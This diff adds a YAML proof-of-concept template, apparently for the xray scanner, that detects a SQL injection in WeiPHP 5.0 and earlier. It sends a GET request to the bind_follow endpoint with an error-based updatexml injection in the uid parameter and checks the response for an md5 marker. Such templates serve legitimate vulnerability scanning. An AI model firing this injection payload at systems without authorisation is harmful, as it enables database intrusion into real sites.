@@ -1,0 +1,13 @@
+name: poc-yaml-weiphp-sql
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: /public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5({{rand}}),0x7e),1)--+
+    expression:
+      response.body.bcontains(bytes(substr(md5(string(rand)), 0, 31)))
+detail:
+  author: sakura404x
+  version: Weiphp<=5.0
+  links:
+    - https://github.com/Y4er/Y4er.com/blob/15f49973707f9d526a059470a074cb6e38a0e1ba/content/post/weiphp-exp-sql.md
